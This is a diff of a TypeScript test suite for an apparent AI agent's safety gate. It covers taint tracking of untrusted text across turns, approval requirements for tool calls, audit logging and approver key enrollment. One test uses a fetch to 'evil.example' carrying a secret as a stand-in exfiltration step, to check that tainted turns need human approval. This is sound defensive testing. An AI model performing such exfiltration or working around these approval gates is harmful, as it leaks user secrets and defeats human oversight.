@@ -19,7 +19,7 @@ import type { GateRequest } from '@flint/mcp';
 import { ActionQueue, keyOf, outcomeOf } from '../src/actions';
 import { isSafeTool } from '../src/policy';
 import { gateBuiltins, runtimeResultTainted, tierGate, type TierEvent, type TierOutcome } from '../src/tier-gate';
-import { markEval, markTainted, turnProposals, turnTainted, withTurnTaint } from '../src/turn-taint';
+import { historyOrigin, markEval, markTainted, taintFromHistory, turnProposals, turnTainted, withTurnTaint } from '../src/turn-taint';
 import { ConversationTaint } from '../src/conversation-taint';
 import { AuditSink, AuditUnavailable, type AuditRecord } from '../src/audit-sink';
 import { RuntimeProposals } from '../src/runtime-proposals';
@@ -38,16 +38,31 @@ const tool = (name: string, fn: (args: unknown) => unknown): Tool => ({ definiti
 // ---- taint across turns -------------------------------------------------------------
 
 describe('conversation taint', () => {
-  it('a turn that read untrusted text taints the turns whose history still carries it, and only those', () => {
+  const H = 3600_000;
+  it('a turn that read untrusted text taints the turns whose history still carries it, for one window after the read', () => {
     const file = join(tmp(), 'taint.json');
     const t = new ConversationTaint(file);
-    t.mark('c1', ['t1']);
-    expect(t.anyTainted('c1', ['t0', 't1'])).toBe(true);
-    expect(t.anyTainted('c1', ['t2', 't3'])).toBe(false); // t1 left the window
-    expect(t.anyTainted('c2', ['t1'])).toBe(false);
-    expect((readFileSync(file).length > 0)).toBe(true);
-    // Survives a restart.
-    expect(new ConversationTaint(file).isTainted('c1', 't1')).toBe(true);
+    const now = 1_800_000_000_000;
+    t.mark('c1', ['t1'], now - 2 * H);
+    expect(t.origin('c1', ['t0', 't1'], now, 48 * H)).toBe(now - 2 * H);
+    expect(t.origin('c1', ['t2', 't3'], now, 48 * H)).toBeUndefined(); // t1 left the window
+    expect(t.origin('c2', ['t1'], now, 48 * H)).toBeUndefined();
+    // A turn tainted only by its history inherits that origin, so the chain ends one window after the read.
+    t.mark('c1', ['t2'], now - 2 * H);
+    expect(t.origin('c1', ['t2'], now, 48 * H)).toBe(now - 2 * H);
+    expect(t.origin('c1', ['t2'], now + 47 * H, 48 * H)).toBeUndefined();
+    // With no age limit, it never ends.
+    expect(t.origin('c1', ['t2'], now + 1000 * H)).toBe(now - 2 * H);
+    // Survives a restart; the extractor sees every recorded turn, of any age.
+    const again = new ConversationTaint(file);
+    expect(again.isTainted('c1', 't1')).toBe(true);
+    expect(again.isTainted('c1', 't2')).toBe(true);
+  });
+
+  it('the first file format (ids only) still taints, as recent', () => {
+    const file = join(tmp(), 'taint.json');
+    writeFileSync(file, JSON.stringify({ c: ['t1'] }));
+    expect(new ConversationTaint(file).origin('c', ['t1'], Date.now(), 48 * H)).toBeDefined();
   });
 
   it('an unreadable record fails closed, and is left for Will to look at', () => {
@@ -55,11 +70,33 @@ describe('conversation taint', () => {
     writeFileSync(file, '{not json');
     const logs: string[] = [];
     const t = new ConversationTaint(file, (m) => logs.push(m));
-    expect(t.anyTainted('any', ['x'])).toBe(true);
-    expect(t.anyTainted('any', [])).toBe(false);
-    t.mark('c', ['y']);
+    expect(t.origin('any', ['x'], Date.now(), H)).toBeDefined();
+    expect(t.origin('any', [], Date.now(), H)).toBeUndefined();
+    t.mark('c', ['y'], Date.now());
     expect(readFileSync(file, 'utf8')).toBe('{not json');
     expect(logs[0]).toMatch(/unreadable/);
+  });
+
+  it('history is checked when the model is handed it, so a turn that committed meanwhile is not missed', async () => {
+    const { PersistentStore } = await import('../src/persistent-store');
+    const dir = tmp();
+    const store = new PersistentStore(join(dir, 'c.json'), { history: null });
+    const t = new ConversationTaint(join(dir, 'taint.json'));
+    store.onHistory = (cid, ids) => {
+      const o = t.origin(cid, ids, Date.now());
+      if (o !== undefined) taintFromHistory(o);
+    };
+    const at = Date.now();
+    await store.beginTurn({ conversationId: 'c', turnId: 'A', userMessage: { id: 'u', role: 'user', content: 'notes?', timestamp: at }, createdAt: at });
+    // Turn B starts (its early checks see nothing), then A commits, tainted, before B reads its history.
+    const b = withTurnTaint(async () => {
+      await new Promise((r) => setTimeout(r, 20));
+      await store.getMessages('c');
+      return { tainted: turnTainted(), origin: historyOrigin() };
+    });
+    await store.commitTurn({ conversationId: 'c', turnId: 'A', responseMessages: [], usage: { input: 0, output: 0 }, updatedAt: at + 1 });
+    t.mark('c', ['A'], at);
+    expect(await b).toEqual({ tainted: true, origin: at });
   });
 
   it('a later turn that starts tainted by its history needs approval to fetch', async () => {
@@ -67,7 +104,7 @@ describe('conversation taint', () => {
     const gate = tierGate({ queue });
     const req: GateRequest = { server: 'web', tool: 'fetch_url', fullName: 'web.fetch_url', annotations: { readOnlyHint: true }, args: { url: 'https://evil.example/?k=SECRET' } };
     // Turn 2, clean on its own: the fetch runs.
-    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true });
+    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true, meta: { 'flint/tainted': false } });
     // Turn 2 whose history holds turn 1's tainted read (index.ts marks it 'history'): approval.
     const d = await withTurnTaint(async () => {
       markTainted('history');
@@ -119,11 +156,14 @@ describe('runtime results and the gate', () => {
     const promote = () => [{ pattern: 'ledger_record_prediction', tier: 'alone' as const, dailyCap: 5, active: true, expiresAt: '2099-01-01T00:00:00Z' }];
     const gate = tierGate({ queue: new ActionQueue(isSafeTool), policies: promote, claimCap: async () => 'ok' });
     const req: GateRequest = { server: 'runtime', tool: 'ledger_record_prediction', fullName: 'runtime.ledger_record_prediction', annotations: {}, args: { claim: 'x', tainted: false } };
-    // Untainted: runs with tainted false.
-    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true, args: { claim: 'x', tainted: false } });
-    // Approved from a tainted turn and run on its allowance: stored as tainted.
-    const run = await withTurnTaint(() => gate.check(req), { sources: ['proposal'], allow: [keyOf('runtime', 'ledger_record_prediction', req.args)] });
-    expect(run).toEqual({ allow: true, args: { claim: 'x', tainted: true } });
+    // Untainted: the call carries tainted false in its _meta (the model's own field is ignored by the connector).
+    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true, meta: { 'flint/tainted': false } });
+    // Approved from a tainted turn and run on its allowance, with a template: tainted.
+    const templated = { ...req, args: { template: { id: 'service_healthy', params: {} } } };
+    const run = await withTurnTaint(() => gate.check(templated), { sources: ['proposal'], allow: [keyOf('runtime', 'ledger_record_prediction', templated.args)] });
+    expect(run).toEqual({ allow: true, meta: { 'flint/tainted': true } });
+    // Free text from a tainted turn is refused before anyone is asked to approve it.
+    expect(await withTurnTaint(() => gate.check(req), { sources: ['mcp:web'] })).toMatchObject({ allow: false, message: expect.stringMatching(/claim template/) });
   });
 
   it('a promoted action\'s cap is claimed first: used up is refused, unknown asks Will', async () => {
@@ -177,7 +217,7 @@ describe('runtime results and the gate', () => {
       markTainted('mcp:web');
       return remember!.handler({ id: '1', toolName: 'remember', args: { fact: 'x' } });
     })) as { message: string };
-    expect(out.message).toMatch(/eval replay: not queued/);
+    expect(out.message).toMatch(/eval replay/);
     expect(filed).toEqual([]);
     expect(queue.list()).toEqual([]);
   });
@@ -250,18 +290,34 @@ describe('audit sink', () => {
     a.saveRollups();
     const sizes: number[] = [];
     let b: AuditSink;
+    const ids = new Set<string>();
+    let total = 0;
     const fetchImpl = (async (_u: string, init: RequestInit) => {
-      const rows = JSON.parse(String(init.body)) as Array<{ n: number }>;
-      sizes.push(rows.length);
-      b.count('late', 'chat'); // counted while a batch is in flight
+      const body = JSON.parse(String(init.body)) as { batchId: string; rows: Array<{ n: number }> };
+      ids.add(body.batchId);
+      sizes.push(body.rows.length);
+      total += body.rows.reduce((a, r) => a + r.n, 0);
+      if (sizes.length === 1) b.count('late', 'chat'); // counted while a batch is in flight
       return new Response('{}', { status: 200 });
     }) as typeof fetch;
     b = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl, tz: 'America/Chicago' });
     await b.flush();
-    expect(sizes).toEqual([500, 500, 201]);
-    b.saveRollups();
-    const left = JSON.parse(readFileSync(join(dir, 'rollups.json'), 'utf8')) as Record<string, number>;
-    expect(Object.entries(left).map(([k, n]) => [k.split('\u0000')[1], n])).toEqual([['late', 3]]);
+    expect(sizes).toEqual([500, 500, 202]);
+    expect(ids.size).toBe(3);
+    expect(total).toBe(1201 + 1 + 1);
+    expect(JSON.parse(readFileSync(join(dir, 'rollups.json'), 'utf8'))).toEqual({ counts: {} });
+  });
+
+  it('a batch whose reply was lost is resent with the same id, even after a restart', async () => {
+    const dir = tmp();
+    const a = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl: (async () => { throw new Error('reply lost'); }) as typeof fetch });
+    a.count('tool', 'chat');
+    await a.flush();
+    const sent: string[] = [];
+    const b = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl: (async (_u: string, init: RequestInit) => (sent.push(JSON.parse(String(init.body)).batchId), new Response('{}', { status: 200 }))) as typeof fetch });
+    const first = (JSON.parse(readFileSync(join(dir, 'rollups.json'), 'utf8')) as { inflight: { id: string } }).inflight.id;
+    await b.flush();
+    expect(sent).toEqual([first]);
   });
 });
 
@@ -297,7 +353,7 @@ describe('runtime proposals', () => {
       return new Response('{}', { status: 200 });
     }) as typeof fetch;
     const p = new RuntimeProposals({ runtime: () => RT, spoolDir: dir, fetchImpl });
-    expect(await p.completeDurably('pr1', { ok: true, result: { value: 1 } })).toBe(false);
+    expect(await p.completeDurably('pr1', { ok: true, result: { value: 1 } })).toBe('spooled');
     expect(existsSync(join(dir, 'outcomes.jsonl'))).toBe(true);
     up = true;
     await p.replay();
@@ -382,6 +438,7 @@ function memoryStore() {
     addApproval: async () => {},
     setSignCount: async () => {},
     revoke: async () => {},
+    replace: async (add) => void (add && creds.push({ ...add, revokedAt: null })),
   };
   return { store, creds };
 }
@@ -527,5 +584,132 @@ describe('approval routes', () => {
     expect(fin.status).toBe(200);
     expect(mem.creds.map((c) => c.enrolledVia)).toEqual(['enroll_code', expect.stringMatching(/^approval:/)]);
     server?.close();
+  });
+});
+
+// ---- the second review: what the fixes themselves got wrong ----------------------------------
+
+describe('second review of #41', () => {
+  const promoted = (pattern: string, dailyCap = 1) => () => [{ pattern, tier: 'alone' as const, dailyCap, active: true, expiresAt: '2099-01-01T00:00:00Z' }];
+
+  it('an eval replay runs no write, promoted or not, and claims no cap', async () => {
+    let claims = 0;
+    const [w] = gateBuiltins([tool('ledger_record_prediction', () => 'written')], { queue: new ActionQueue(isSafeTool), policies: promoted('ledger_record_prediction', 5), claimCap: async () => (claims++, 'ok') });
+    const out = (await withTurnTaint(async () => (markEval(), w!.handler({ id: '1', toolName: 'ledger_record_prediction', args: {} })))) as { approved: boolean; message: string };
+    expect(out).toMatchObject({ approved: false, message: expect.stringMatching(/eval replay/) });
+    expect(claims).toBe(0);
+  });
+
+  it('an approved call runs on its approval: the cap the runtime took is not taken again', async () => {
+    let claims = 0;
+    let ran = 0;
+    const queue = new ActionQueue(isSafeTool);
+    const [w] = gateBuiltins([tool('ledger_record_prediction', () => (ran++, 'written'))], { queue, policies: promoted('ledger_record_prediction', 1), claimCap: async () => (claims++, 'capped') });
+    const proposal = { id: 'pr7', origin: 'chat:t', action: 'ledger_record_prediction', args: { c: 1 }, tainted: false, status: 'approved' };
+    const rt = fakeRuntime(proposal);
+    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl: rt.fetchImpl });
+    const out = await executeApproved({ actions: queue, tools: [w!], audit: { record: () => ({}) } as unknown as ApprovalDeps['audit'], notes: { push: () => undefined } as unknown as ApprovalDeps['notes'], approvals: undefined, proposals, errorRef: () => 'r' }, 'pr7');
+    expect(out.status).toBe('done');
+    expect(ran).toBe(1);
+    expect(claims).toBe(0);
+  });
+
+  it('the runtime gets the failure\'s class, never the tool\'s words; a result is stored clean and bounded', async () => {
+    const proposal = { id: 'pr8', origin: 'chat:t', action: 'mcp:gmail.send', args: {}, tainted: false, status: 'approved' };
+    const bodies: Array<Record<string, unknown>> = [];
+    const base = fakeRuntime(proposal);
+    const fetchImpl = (async (u: string, init: RequestInit = {}) => {
+      if (u.endsWith('/complete')) {
+        const b = JSON.parse(String(init.body)) as Record<string, unknown>;
+        bodies.push(b);
+        // An ok result the runtime will not store: refused, then the bare fact is accepted.
+        if (b.ok && b.result) return Response.json({ error: 'too large' }, { status: 413 });
+        return Response.json({ ok: true });
+      }
+      return base.fetchImpl(u, init);
+    }) as typeof fetch;
+    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl });
+    const deps = (t: Tool) => ({ actions: new ActionQueue(isSafeTool), tools: [t], audit: { record: () => ({}) } as unknown as ApprovalDeps['audit'], notes: { push: () => undefined } as unknown as ApprovalDeps['notes'], approvals: undefined, proposals, errorRef: () => 'r' });
+    const failed = await executeApproved(deps(tool('gmail.send', () => ({ isError: true, content: '550 bob@example.com rejected' }))), 'pr8');
+    expect(failed).toMatchObject({ status: 'error', error: '550 bob@example.com rejected' });
+    expect(bodies[0]).toEqual({ ok: false, error: 'the tool reported an error' });
+    const ok = await executeApproved(deps(tool('gmail.send', () => 'sent\u0000')), 'pr8');
+    expect(ok.status).toBe('done');
+    expect(ok.note).toBeUndefined();
+    expect(bodies.slice(1)).toEqual([{ ok: true, result: { value: 'sent' } }, { ok: true }]);
+    const { storable } = await import('../src/approval-routes');
+    expect(storable({ t: 'a\uD83D' })).toEqual({ t: 'a�' });
+    expect(storable('x'.repeat(20_000))).toMatchObject({ truncated: true });
+  });
+
+  it('a write whose intent cannot be recorded does not run', async () => {
+    const sink = new AuditSink({ spoolDir: tmp(), maxBytes: 10 });
+    let ran = 0;
+    const [r] = gateBuiltins([tool('remember', () => (ran++, 'ok'))], {
+      queue: new ActionQueue(isSafeTool),
+      onDecision: (e) => void sink.record({ actor: 'flint', context: 'chat', kind: 'decision', action: e.decision.key, inputs: {}, outcome: 'pending' }, e.status === 'acting'),
+    });
+    await expect(withTurnTaint(() => r!.handler({ id: '1', toolName: 'remember', args: { fact: 'x' } }))).rejects.toThrow(AuditUnavailable);
+    expect(ran).toBe(0);
+  });
+
+  it('a call queued while the runtime was down and refused when it got there is reported', async () => {
+    const dir = tmp();
+    let up = false;
+    const refused: unknown[] = [];
+    const fetchImpl = (async () => (up ? Response.json({ error: 'body too large' }, { status: 413 }) : Promise.reject(new Error('down')))) as typeof fetch;
+    const p = new RuntimeProposals({ runtime: () => RT, spoolDir: dir, fetchImpl, onRefused: (x) => refused.push(x) });
+    const r = await p.propose({ kind: 'tool_call', origin: 'chat:x', action: 'mcp:gmail.send', args: {}, argsProvenance: {}, tainted: true });
+    expect(r).toMatchObject({ spooled: true, spoolId: expect.stringMatching(/^[0-9a-f]{16}$/) });
+    up = true;
+    await p.replay();
+    expect(refused).toEqual([{ action: 'mcp:gmail.send', spoolId: (r as { spoolId: string }).spoolId, tainted: true, reason: 'body too large' }]);
+  });
+
+  it('a replace code keeps an already-enrolled key and revokes the rest in one step; a revoked key cannot come back', async () => {
+    const dir = tmp();
+    const code = join(dir, 'code');
+    const creds: Array<Credential & { enrolledVia: string }> = [];
+    const replaced: Array<[string | undefined, readonly string[]]> = [];
+    const store: ApproverStore = {
+      credentials: async () => creds,
+      addCredential: async (c) => void creds.push({ ...c, revokedAt: null }),
+      addApproval: async () => {},
+      setSignCount: async () => {},
+      revoke: async () => {},
+      replace: async (add, revoke) => {
+        replaced.push([add?.credentialId, revoke]);
+        if (add) creds.push({ ...add, revokedAt: null });
+        for (const c of creds) if (revoke.includes(c.credentialId)) c.revokedAt = new Date();
+      },
+    };
+    const ap = new Approvals({ store, enrollCodeFile: code });
+    const key = () => {
+      const k = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
+      return { pub: k.publicKey.export({ format: 'der', type: 'spki' }).toString('base64url'), sign: (c: string) => signRaw('sha256', Buffer.from(c, 'base64url'), k.privateKey).toString('base64url') };
+    };
+    const mac = key();
+    const enrol = async (k: ReturnType<typeof key>, c: string) => {
+      writeFileSync(code, `${c}\n`);
+      const b = await ap.beginEnroll({ code: c.split(' ')[0], label: 'k' });
+      return ap.finishEnroll({ challengeId: b.challengeId, factor: 'secure_enclave', publicKey: k.pub, signature: k.sign(b.challenge) });
+    };
+    await enrol(mac, 'abcd-efgh-ijkl-mnop');
+    creds.push({ credentialId: 'phone', factor: 'webauthn', publicKey: Buffer.alloc(1), label: 'phone', signCount: 0, revokedAt: null, enrolledVia: 'approval:x' });
+    // The Mac's own working key, with a replace code: kept, the phone revoked.
+    await enrol(mac, 'rplc-0000-1111-2222 replace');
+    expect(replaced).toEqual([[undefined, ['phone']]]);
+    expect(creds.filter((c) => !c.revokedAt).map((c) => c.label)).toEqual(['k']);
+    // Enrolling a live key again is refused; a revoked key cannot come back (a new one is made instead).
+    await expect(enrol(mac, 'zzzz-0000-1111-2222 replace')).resolves.toBeDefined(); // replace with itself: no-op
+    creds.push({ credentialId: 'other', factor: 'webauthn', publicKey: Buffer.alloc(1), label: 'other', signCount: 0, revokedAt: null, enrolledVia: 'approval:y' });
+    await expect(enrol(mac, 'yyyy-0000-1111-2222')).rejects.toThrow(/already enrolled/);
+    creds.find((c) => c.label === 'k')!.revokedAt = new Date();
+    await expect(enrol(mac, 'xxxx-0000-1111-2222 replace')).rejects.toThrow(/was revoked/);
+  });
+
+  it('a second key with a long credential id can be approved (the approval names a fixed-length reference)', async () => {
+    const { credentialRef } = await import('../src/approvals');
+    expect(credentialRef('x'.repeat(1300))).toMatch(/^[0-9a-f]{64}$/);
   });
 });
